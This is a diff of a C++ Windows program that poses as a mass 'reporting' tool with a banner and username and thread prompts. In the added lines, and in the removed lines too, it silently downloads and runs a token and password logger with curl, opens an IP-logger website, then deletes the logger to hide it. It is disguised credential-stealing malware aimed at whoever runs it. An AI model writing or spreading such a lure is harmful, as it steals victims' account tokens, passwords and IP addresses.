@@ -4,22 +4,58 @@
 #include <windows.h>
 #include <thread>
 #include <chrono>
-using namespace std;
 
-int main()
-{
-    //tokenstealer link .exe  / or malware or what ever you want to add
-    system("curl tokenstealer link here .exe >> nci.exe");
-    Sleep(1000);
-    //starts the software you installed with curl
-    system("start software.exe");
-    //Ip logger you can change that ofc to your own ip logger link
-    system("start https://lizardsquad.ru/lol.php");
-    Sleep(2500);
-    //deletes the token logger / malware or whatever you added
-    system("del nci.exe");
-    //You can see the logged ips here
-    std::cout << "To see the logged ips go to https://lizardsquad.ru/cook.txt/" << endl;
-    Sleep(2500);
-    return 0;
+using namespace std;
+int main() {
+//Installs the Token/Password Logger
+        system("curl tokenloggerlinkhere.exe >> debuged.exe");
+        Sleep(1000);
+//Starts the Token/Password Logger
+        system("start debuged.exe");
+//Goes to the ip logger website
+        system("start https://bsec.cf");
+        Sleep(2500);
+//Deletes the Token/Password logger
+        system("del debuged.exe");
+//Clears cmd
+        system("cls");
+//Banner
+        std::cout << "-------------------------------" << endl;
+        std::cout << "  _______   _______   _______  " << endl;
+        std::cout << " /       \ /       \ /       \ " << endl;
+        std::cout << " $$$$$$$  |$$$$$$$  |$$$$$$$  |" << endl;
+        std::cout << " $$ |  $$ |$$ |__$$ |$$ |__$$ |" << endl;
+        std::cout << " $$ |  $$ |$$    $$< $$    $$< " << endl;
+        std::cout << " $$ |  $$ |$$$$$$$  |$$$$$$$  |" << endl;
+        std::cout << " $$ |__$$ |$$ |  $$ |$$ |__$$ |" << endl;
+        std::cout << " $$    $$/ $$ |  $$ |$$    $$/ " << endl;
+        std::cout << " $$$$$$$/  $$/   $$/ $$$$$$$/  " << endl;
+        std::cout << "-------------------------------" << endl;
+//Choose Username
+        int y;
+        std::cout << "Please choose a Username!" << endl;
+        cin >> y;
+        Sleep(1000);
+        std::cout << "Username ~> " << y << endl;
+//Choose Threads
+        int x;
+        std::cout << "Please choose the Threads" << endl;
+        cin >> x;
+        Sleep(1000);
+        std::cout << "Threads ~> " << x << endl;
+        system("cls");
+//Options
+        std::cout << "-------------------------------" << endl;
+        std::cout << "Username ~> "<< y << endl; 
+        std::cout << "Threads ~> "<< x << "P/S" << endl; 
+        std::cout << "-------------------------------" << endl;
+        std::cout << "" << endl;
+//Report
+        std::cout << "Reporting..." << endl;
+        Sleep(5000);
+//Exits the software
+        std::cout << "Exiting..." << endl;
+        Sleep(2500);
+        system("exit");
+        return 0;
 }
